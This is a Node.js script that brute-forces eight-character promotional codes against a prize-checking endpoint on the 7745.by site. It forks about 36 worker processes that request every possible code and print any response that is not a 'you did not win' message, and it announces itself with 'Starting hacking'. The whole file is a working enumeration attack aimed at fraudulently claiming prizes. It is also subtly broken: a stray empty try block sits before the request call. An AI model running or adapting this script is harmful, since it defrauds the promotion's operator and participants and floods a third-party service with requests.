const axios = require('axios');
const cluster = require('cluster');
const moment = require('moment');
const numCPUs = require('os').cpus().length;
const Combinatorics = require('js-combinatorics');

const alphabet = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
    'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6',
    '7', '8', '9', '0'];

const CODE_LENGTH = 8;
const ACCOMODATIONS_NUMBER = alphabet.length ** CODE_LENGTH;
const BUNCH_SIZE = ACCOMODATIONS_NUMBER / 100;
const INCREMENT = 'INCREMENT';
const precision = 8;

let getPercentsStringWithPrecision = (number, precision) => {
    return Math.round(number * Math.pow(10, precision + 2)) / Math.pow(10, precision)  + '%';
};

let getETA = (startTime, part) => {
    let msLeft = (moment() - startTime) / part;
    return moment().add(msLeft, 'milliseconds').fromNow();
};

const perms = Combinatorics.baseN(alphabet, CODE_LENGTH - 1);
let currentPerm;

let main = async () => {
    if (cluster.isMaster) {
        console.log('===============================');
        console.log(`Starting hacking on ${numCPUs} CPUs`);
        console.log('===============================\n');

        console.log(`Master ${process.pid} is running`);
        let startTime = moment();

        // Fork workers.
        for (let i = 0; i < alphabet.length; i++) {
            cluster.fork();
        }

        let k = 0;
        cluster.on('message', (worker, msg) => {
            if (msg.topic === INCREMENT) {
                // logging
                k++;
                if (k % BUNCH_SIZE === 0) {
                    console.log("Codes checked: ", k);
                    console.log("in percents: ", getPercentsStringWithPrecision(k / ACCOMODATIONS_NUMBER, precision));
                    console.log("started processing: ", startTime.fromNow());
                    console.log("ETA: ", getETA(startTime, k / ACCOMODATIONS_NUMBER))
                }
                // logging
            }
        });

        cluster.on('exit', (worker, code, signal) => {
            console.log(`worker ${worker.process.pid} died`);
        });
    } else {
        console.log(`Worker ${cluster.worker.id} started`);

        let incrementCounter = () => {
            process.send({ topic: INCREMENT });
        };
        let workerLetter = alphabet[cluster.worker.id - 1];

        while (currentPerm = perms.next()) {
            let code = currentPerm.join('') + workerLetter;
            try {}await axios.get(`https://7745.by/krynka/check-code/${code}`)
                .then(res => {
                    if (!res.data.message.includes('не выиграли')) {
                        console.log("FOUND: ", res.data.message, code);
                    }
                })
                .catch(err => {
                    console.log("ERROR: ", err.response.status, code);
                })
                .finally(() => {
                    incrementCounter();
                })
        }
    }
};

main();

